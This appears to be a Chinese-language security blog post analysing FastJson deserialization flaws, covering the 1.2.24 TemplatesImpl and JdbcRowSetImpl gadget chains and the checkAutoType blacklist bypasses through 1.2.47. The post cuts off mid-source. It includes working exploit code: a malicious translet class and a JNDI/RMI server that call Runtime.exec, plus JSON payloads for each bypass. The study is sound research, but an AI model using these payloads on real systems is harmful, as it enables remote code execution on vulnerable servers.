了解Java代理的一些知识，其实动态代理在一些POC、EXP的编写中用的还是比较多的，同时对后面RMI和JDNI注入学习也有很大帮助。之后会进一步分析一些利用链来进一步分析。\nReference https://www.cnblogs.com/aduner/p/14646877.html https://xz.aliyun.com/t/9197#toc-2 https://tttang.com/archive/1769/#toc_java ","permalink":"http://www.reus09.top/posts/tech/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","summary":"实际上在之前的学习阶段复现了一些CVE漏洞，但是发现还是存在基础方面的缺陷，对Java安全缺乏系统性的整理，因此从今天这篇开始，系统的整理学","title":"Java之动态代理"},{"content":"实际上，前不久刚刚分析了FastJson1.2.80漏洞，一方面对Java反序列化漏洞有了一个初步的了解，如果可以控制一个类的实例化，并且这个类里面的成员也存在可控，就可以注入恶意JSON实现反序列漏洞，另一方面由于FastJson1.2.25之后都是对AutoType机制进行绕过，所以也简单学习了AutoTypeCheck机制，还有一些期望类的Gadget。本文主要对FastJson常用的的解析String的parse,parseObject等方法进行分析，然后分析AutoTypeCheck机制，同时也对FastJson历史漏洞进行简单的整理。\n漏洞介绍 这里就再介绍一下FastJson的背景。\nfastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。\n由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第一次报告安全漏洞至今，进行了若干次的安全更新，也与安全研究人员进行了来来回回多次的安全补丁-绕过的流程。\n这里放一下框架图\n主要功能在DefaultJSONParser类中实现的，在这个类中会应用其他的一些外部类来完成后续操作。ParserConfig主要是进行配置信息的初始化，JSONLexer主要是对json字符串进行处理并分析，反序列化在JavaBeanDeserializer中处理。\n反序列化方法 将 json 数据反序列化时常使用的方法为parse()、parseObject()、parseArray()，这三个方法也均包含若干重载方法，带有不同参数：\n反序列化特性：com.alibaba.fastjson.parser.Feature， 类的类型：java.lang.reflect.Type，用来执行反序列化类的类型。 处理泛型反序列化：com.alibaba.fastjson.TypeReference。 编程扩展定制反序列化：com.alibaba.fastjson.parser.deserializer.ParseProcess，例如ExtraProcessor 用于处理多余的字段，ExtraTypeProvider 用于处理多余字段时提供类型信息。 这里列举一些 fastjson 功能要点：\n使用 JSON.parse(jsonString) 和 JSON.parseObject(jsonString, Target.class)，两者调用链一致，前者会在 jsonString 中解析字符串获取 @type 指定的类，后者则会直接使用参数中的class。 fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 get 开头且第4位是大写字母、方法不能有参数传入、继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 set 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 com.alibaba.fastjson.util.JavaBeanInfo.build() 中。 使用 JSON.parseObject(jsonString) 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。 如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 Feature.SupportNonPublicField 参数。 fastjson 在为类属性寻找 get/set 方法时，调用函数 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch() 方法，会忽略 _|- 字符串，也就是说哪怕你的字段名叫 _a_g_e_，getter 方法为 getAge()，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 _ 和 - 进行组合混淆。 fastjson 在反序列化时，如果 Field 类型为 byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。 为了测试以上内容，我们写一个demo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 package com.reus09; import com.alibaba.fastjson.JSON; import java.io.UnsupportedEncodingException; import java.util.Arrays; import java.util.Properties; import java.util.Base64; /** * @ClassName FastJsonTest * @Description TODO * @Author reus09 * @Date 2022/10/11 19:34 * @Version 1.0 **/ public class FastJsonTest { public String t1; private Integer t2; private Boolean t3; private Properties t4; private Properties t5; private byte[] t6; @Override public String toString() { return \u0026#34;FastJsonTest{\u0026#34; + \u0026#34;t1=\u0026#39;\u0026#34; + t1 + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, t2=\u0026#34; + t2 + \u0026#34;, t3=\u0026#34; + t3 + \u0026#34;, t4=\u0026#34; + t4 + \u0026#34;, t5=\u0026#34; + t5 + \u0026#34;, t6=\u0026#34; + Arrays.toString(t6) + \u0026#39;}\u0026#39;; } public byte[] getT6() { return t6; } public void setT6(byte[] t6) { this.t6 = t6; } public FastJsonTest() { System.out.println(\u0026#34;FastJsonTest() is called \u0026#34;); } public void setT5(Properties t5) { System.out.println(\u0026#34;setT5()\u0026#34;); this.t5 = t5; } public void setT1(String t1) { System.out.println(\u0026#34;setT1()\u0026#34;); this.t1 = t1; } public void setT2(Integer t2) { System.out.println(\u0026#34;setT2()\u0026#34;); this.t2 = t2; } public String getT1() { System.out.println(\u0026#34;getT1()\u0026#34;); return t1; } public Integer getT2() { System.out.println(\u0026#34;getT2()\u0026#34;); return t2; } public Boolean getT3() { System.out.println(\u0026#34;getT3()\u0026#34;); return t3; } public Properties getT4() { System.out.println(\u0026#34;getT4()\u0026#34;); return t4; } public Properties getT5() { System.out.println(\u0026#34;getT5()\u0026#34;); return t5; } public static void main(String[] args) throws UnsupportedEncodingException { String jsonString = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.reus09.FastJsonTest\\\u0026#34;,\\\u0026#34;t1\\\u0026#34;:\\\u0026#34;t1\\\u0026#34;,\\\u0026#34;t2\\\u0026#34;:1,\\\u0026#34;t3\\\u0026#34;:1,\\\u0026#34;t4\\\u0026#34;:{},\\\u0026#34;t5\\\u0026#34;:{},\\\u0026#34;t6\\\u0026#34;:\\\u0026#34;\u0026#34;+Base64.getEncoder().encodeToString(\u0026#34;Hello,FastJson\u0026#34;.getBytes(\u0026#34;utf-8\u0026#34;))+\u0026#34;\\\u0026#34;}\u0026#34;; System.out.println(\u0026#34;---------JSON.parse(string)-----------\u0026#34;); Object obj = JSON.parse(jsonString); System.out.println(obj); System.out.println(\u0026#34;---------JSON.parseObject(string,clazz)-----------\u0026#34;); Object obj1 = JSON.parseObject(jsonString,FastJsonTest.class); System.out.println(obj1); System.out.println(\u0026#34;---------JSON.parseObject(string)-----------\u0026#34;); Object obj2 = JSON.parseObject(jsonString); System.out.println(obj2); } } 运行结果：\n总的来说，parse(string),parseObject(string,clazzs)与parseObject(string)进行反序列化时的细节区别在于，parse(string) 会识别并调用目标类的 setter 方法，而 parseObject(string) 由于要将返回值转化为JSONObject，多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的getter 方法来将参数赋值给JSONObject，所以反序列化过程中，parseObject(string)的危害性相对会更大。\nFastJson 1.2.24分析 FastJson1.2.24开启了FastJson反序列实现RCE的大门\nfastjson 默认使用 @type 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter/setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。\n这里对1.2.24的两条常见利用链TemplatesImpl 反序列化和JdbcRowSetImpl 反序列化进行简单的学习。\nTemplatesImpl 反序列化 分析一下漏洞利用链的全过程，实际上在查阅资料的同时，发现其也是CommonsCollections-3链子的分析，因为刚刚接触到Java安全,对CC3链只是略有耳闻，之后的学习之中会慢慢学习CC链的各种利用姿势。\n参考的各位大师傅的博客关于TemplateImpl反序列化链的思考都是从漏洞挖掘的思路开始，从getTransletInstance()这个实例化点出发，需要哪一个利用元素就去寻找，最后完善利用过程。\n函数栈调用情况:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 exec:348, Runtime (java.lang) \u0026lt;clinit\u0026gt;:22, Calculartor (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:193, JSON (com.alibaba.fastjson) main:117, FastJsonTest (com.reus09) 首先我们在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance存在一个成员属性 _class，是一个 Class 类型的数组，数组里下标为_transletIndex 的类会在 getTransletInstance() 方法中使用 newInstance() 实例化。\n同时我们发现com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer中调用了getTransletInstance()\n方法,同时,com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties调用了这里的newTransformer()方法。 这里的getOutputProperties()方法就是对TemplatesImpl类的私有元素outputProperties的getter方法\n那么我们只要控制_class以及_transletIndex就可以实现任意类的实例化，从而触发漏洞。\ndefineTransletClasses()与newInstance()在同一方法内，于是查看一下defineTransletClasses() 的逻辑。\n先要求 _bytecodes 不为空，接着就会调用自定义的 ClassLoader 去加载 _bytecodes 中的 byte[] 。而 _bytecodes 也是该类的成员属性。\n_bytecodes变量非空值时，程序将会把_bytecodes数组中的值循环取出，使用loader.defineClass方法从字节码转化为Class对象，随后后赋值给_class[i]。\n而如果这个类的父类为 ABSTRACT_TRANSLET 也就是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，就会将类成员属性的，_transletIndex 设置为当前循环中的标记位，而如果是第一次调用，就是_class[0]。如果父类不是这个类，将会抛出异常。\n那这样一条完整的漏洞调用链就呈现出来了：\n构造一个 TemplatesImpl 类的反序列化字符串，其中 _bytecodes 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 newInstance() 实例化。 在反序列化过程中，由于getter方法 getOutputProperties()，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：getOutputProperties() -\u0026gt; newTransformer() -\u0026gt; getTransletInstance() -\u0026gt; defineTransletClasses() / EvilClass.newInstance(). 同时为了程序在实例化之前因报错退出，需要将_name和_tfactory设置不为空，_tfactory如果不指定会出现空指针。查看_tfactory的定义如下：\n1 private transient TransformerFactoryImpl _tfactory = null; 具体实现：\n一个继承了AbstractTranslet的恶意类,将其编译成字节码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package com.reus09; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; /** * @ClassName Calculartor * @Description TODO * @Author reus09 * @Date 2022/10/12 15:42 * @Version 1.0 **/ public class Calculartor extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } payload部分：\nJSON对应的如下:\n1 2 3 4 5 6 7 { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;, \u0026#34;_bytecodes\u0026#34;: [\u0026#34;yv66vgAAADQA...CJAAk=\u0026#34;], \u0026#34;_name\u0026#34;: \u0026#34;reus09\u0026#34;, \u0026#34;_tfactory\u0026#34;: {}, \u0026#34;_outputProperties\u0026#34;: {}, } 代码如下:\n1 2 3 4 byte[] code = Files.readAllBytes(Paths.get(\u0026#34;/Users/reus09/Desktop/rce/FastJson/target/classes/com/reus09/Calculartor.class\u0026#34;)); String codeString = Base64.getEncoder().encodeToString(code); String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;\u0026#34;+Base64.getEncoder().encodeToString(code)+\u0026#34;\\\u0026#34;],\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;reus09\\\u0026#34;,\\\u0026#34;_tfactory\\\u0026#34;:{ },\\\u0026#34;_outputProperties\\\u0026#34;:{ },\\\u0026#34;_version\\\u0026#34;:\\\u0026#34;1.0\\\u0026#34;,\\\u0026#34;allowedProtocols\\\u0026#34;:\\\u0026#34;all\\\u0026#34;}\u0026#34;; JSON.parse(payload, Feature.SupportNonPublicField); JdbcRowSetImpl 反序列化 JdbcRowSetImpl 类位于 com.sun.rowset.JdbcRowSetImpl ，是 javax.naming.InitialContext#lookup() 参数可控导致的 JNDI 注入。\nJdbcRowSetImpl调用函数栈\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 exec:348, Runtime (java.lang) \u0026lt;init\u0026gt;:19, badClassName (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getObjectFactoryFromReference:174, NamingManager (javax.naming.spi) getObjectInstance:330, NamingManager (javax.naming.spi) decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry) lookup:138, RegistryContext (com.sun.jndi.rmi.registry) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:417, InitialContext (javax.naming) connect:624, JdbcRowSetImpl (com.sun.rowset) setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) main:123, FastJsonTest (com.reus09) 先看一下 setAutoCommit() 方法，在 conn 为空时，将会调用 connect() 方法。\n然后在connect方法里面调用了 javax.naming.InitialContext#lookup() 方法，参数从成员变量 dataSource 中获取。\n通过函数栈的变化，可以很明显的看到，在FastJson解析函数parse函数作用的时候，通过反射给类的元素赋值的时候引起的命令执行。 编写一个JNDI服务\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package com.reus09; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; /** * @ClassName JDNIServer * @Description TODO * @Author reus09 * @Date 2022/10/12 18:09 * @Version 1.0 **/ public class JDNIServer { public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(\u0026#34;com.reus09.badClassName\u0026#34;, \u0026#34;com.reus09.badClassName\u0026#34;,\u0026#34;http://127.0.0.1:8000/\u0026#34;); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\u0026#34;Exploit\u0026#34;,referenceWrapper); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.reus09; import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class badClassName implements ObjectFactory { public badClassName() throws IOException { Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u0026lt;?, ?\u0026gt; environment) throws Exception { return null; } } Payload部分\nJSON格式\n1 2 3 4 5 { \u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/Exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;:true } 代码\n1 2 3 4 5 6 7 8 // 解决java版本过高的问题，默认以下的元素都为false System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); System.setProperty(\u0026#34;com.sun.jndi.rmi.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); System.setProperty(\u0026#34;com.sun.jndi.cosnaming.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); System.out.println(\u0026#34;JdbcRowSetImpl 链的利用\u0026#34;); String payload2 = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/Exploit\\\u0026#34;, \\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload2); AutoType与checkAutoType Fastjson提供了autotype功能,允许用户在反序列化数据中通过“@type”指定反序列化的Class类型。\n简单的来说就是：当一个类中包含了一个接口（或抽象类）的时候，在正常反序列化中，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。FastJson通过使用autotype来对指定的@type实现的接口同样进行正常反序列化。\n具体的话，看panda师傅对AutoType起到的作用进行了简单的介绍。\ncheckAutoType是 FastJson 在 1.2.25 以及之后的版本中，为了防止 autoType 这一机制带来的 安全隐患，增加的检测防御机制，这是一个对于 @type 属性进行白名单+黑名单的限制机制。\n早期版本的checkAutoType存在一些比较低级的绕过方法，如加上L开头;结尾、双写LL绕过 等，直到1.2.48版本后，checkAutoType 变得成熟，黑名单也逐渐完善。\n其具体逻辑，可以用《How i use json deserialization》议题的一张图片概括:\ncheckAutoType首先会对传入的typeName进行3项检测:\n是否是白名单中的类 是否在反序列化cache中(在mappings列表) 类有JSONType注解(如:fastjson.annotation.JSONType) 如果满足以上条件，那么会直接return出去继续执行反序列化流程并且将未载入cache的类载 入cache\n如果没有满足其中的一个条件，那么会进入另一个判断:\n传入的typeName是否在黑名单中 是否继承自RowSet、DataSource、ClassLoader等类 如果满足上述条件之一，那么直接抛出错误 如果都不满足，那么会进行如下判断:\nexpectClass不为NULL、Object、Serializable、Closeable等类型 传入的typeName类继承于expctClass 如果满足以上条件，那么会直接return出去继续执行反序列化流程并且将未载入cache的类载 入cache\n如果不满足，那么会经过autoTypeSupport的判断，autoTypeSupport主要用来打开autotype功能，默认情况下是false，抛出错误，如果设置的是True那么会return出去继续执行反序列化流 程并且将未载入cache的类载入cache。\n历史漏洞分析 fastjson-1.2.25 在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。\n影响版本：1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.41 描述：作者通过为危险功能添加开关，并提供黑白名单两种方式进行安全防护，其实已经是相当完整的防护思路，而且作者已经意识到黑名单类将会无穷无尽，仅仅通过维护列表来防止反序列化漏洞并非最好的办法。而且靠用户自己来关注安全信息去维护也不现实。\n安全更新主要集中在 com.alibaba.fastjson.parser.ParserConfig，首先查看类上出现了几个成员变量：布尔型的 autoTypeSupport，用来标识是否开启任意类型的反序列化，并且默认关闭；字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单。\n其中黑名单 denyList 包括：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework 添加反序列化白名单有3种方法：\n使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(“org.reus09.fastjson.,org.javaweb.”) 加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.reus09.fastjson. 在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.reus09.fastjson. 然后我们分析一下1.2.25版本下的check机制\n首先开启autoTypeSupport,先根据白名单进行判别，再通过黑名单进行判别。如果在，就使用 TypeUtils.loadClass 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。\n如果上面没查询到，通过TypeUtils.getClassFromMapping(typeName)缓存判断\n缓存里面的种类如下：\n缓存也没有，在没有开启autoTypeSupport的时候，先进入黑名单进行判断，然后在白名单进行判断，如果存在白名单，同样进行loadlClass加载。\n最后，如果它是个期望类，并且在黑白名单都没有找到，同样调用loadClass。\n我们通过分析loadClass方法的逻辑，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 [、L、; 字符。\n在这个位置出现了逻辑漏洞，攻击者可以使用带有描述符的类绕过黑名单的限制，而在类加载过程中，描述符还会被处理掉。因此，漏洞利用的思路就出来了：需要开启 autoType，使用以上字符来进行黑名单的绕过。\npayload:\n1 2 3 4 5 6 7 { \u0026#34;@type\u0026#34;: \u0026#34;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\u0026#34;, \u0026#34;_bytecodes\u0026#34;: [\u0026#34;yv66vgAAADQA...CJAAk=\u0026#34;], \u0026#34;_name\u0026#34;: \u0026#34;reus09\u0026#34;, \u0026#34;_tfactory\u0026#34;: {}, \u0026#34;_outputProperties\u0026#34;: {}, } fastjson-1.2.42 在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。\n影响版本：1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.42 描述：通过变量常用的jar、类、字符串碰撞hash得到黑名单\n还是关注 com.alibaba.fastjson.parser.ParserConfig 这个类，作者将原本的明文黑名单转为使用了 Hash 黑名单，防止安全人员对其研究。\n加密方式在com.alibaba.fastjson.util.TypeUtils#fnv1a_64是有的\n并且在 checkAutoType 中加入判断，如果类的第一个字符是 L 结尾是 ;，则使用 substring 进行了去除。还是用hash写的。\n但是这种判断完全是徒劳的，因为在最后loadClass处理时是递归处理，因此只要对描述符进行双写即可绕过：\npayload:\n1 2 3 4 5 6 7 { \u0026#34;@type\u0026#34;: \u0026#34;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\u0026#34;, \u0026#34;_bytecodes\u0026#34;: [\u0026#34;yv66vgAAADQA...CJAAk=\u0026#34;], \u0026#34;_name\u0026#34;: \u0026#34;reus09\u0026#34;, \u0026#34;_tfactory\u0026#34;: {}, \u0026#34;_outputProperties\u0026#34;: {}, } fastjson-1.2.43 这个版本主要是修复上一个版本中双写绕过的问题。\n影响版本：1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.43 描述：上有政策，下有对策。在 L、; 被进行了限制后，安全研究人员将目光转向了 [。\n可以看到用来检查的 checkAutoType 代码添加了判断，如果类名连续出现了两个 L 将会抛出异常\n这样使用 L、; 绕过黑名单的思路就被阻挡了，但是在 loadClass 的过程中，还针对 [ 也进行了处理和递归.\npayload:\n1 2 3 4 5 6 7 { \u0026#34;@type\u0026#34;: \u0026#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;[, {\u0026#34;_bytecodes\u0026#34;: [\u0026#34;yv66vgAAADQA...CJAAk=\u0026#34;], \u0026#34;_name\u0026#34;: \u0026#34;reus09\u0026#34;, \u0026#34;_tfactory\u0026#34;: {}, \u0026#34;_outputProperties\u0026#34;: {}, } fastjson-1.2.44 这个版本主要是修复上一个版本中使用 [ 绕过黑名单防护的问题。\n影响版本：1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.44 描述：在此版本将 [ 也进行修复了之后，由字符串处理导致的黑名单绕过也就告一段落了。\n在 checkAutoType 中添加了新的判断，如果类名以 [ 开始则直接抛出异常。\n可以使用像fastjson-1.2.45的payload byPass\nfastjson-1.2.45 在此版本爆出了一个黑名单绕过，实际上，黑名单是无穷无尽的，随着 fastjson 的版本更新，一定会有更多的黑名单爆出来，因为隔壁 jackson 都是明文黑名单的，只要隔壁一更新，大家都看到了，就会拿来看 fastjson。\n影响版本：1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.45 描述：黑名单列表需要不断补充。\npayload如下：\n1 2 3 4 5 6 { \u0026#34;@type\u0026#34;:\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\u0026#34;, \u0026#34;properties\u0026#34;:{ \u0026#34;data_source\u0026#34;:\u0026#34;ldap://127.0.0.1:23457/Command8\u0026#34; } } 需要pom\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.ibatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;ibatis-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; fastjson-1.2.47 在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。\n影响版本：1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.32 未开启 AutoTypeSupport 影响版本：1.2.33 \u0026lt;= fastjson \u0026lt;= 1.2.47不论是否开启AutoTypeSupport 描述：作者删除了一个 fastjson 的测试文件：https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66 ，里面包含了这次通杀漏洞的 payload。\n分析 这次的绕过问题还是出现在 checkAutoType() 方法中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 public Class\u0026lt;?\u0026gt; checkAutoType(String typeName, Class\u0026lt;?\u0026gt; expectClass, int features) { // 类名非空判断 if (typeName == null) { return null; } // 类名长度判断，不大于128不小于3 if (typeName.length() \u0026gt;= 128 || typeName.length() \u0026lt; 3) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } String className = typeName.replace(\u0026#39;$\u0026#39;, \u0026#39;.\u0026#39;); Class\u0026lt;?\u0026gt; clazz = null; final long BASIC = 0xcbf29ce484222325L; //; final long PRIME = 0x100000001b3L; //L final long h1 = (BASIC ^ className.charAt(0)) * PRIME; // 类名以 [ 开头抛出异常 if (h1 == 0xaf64164c86024f1aL) { // [ throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } // 类名以 L 开头以 ; 结尾抛出异常 if ((h1 ^ className.charAt(className.length() 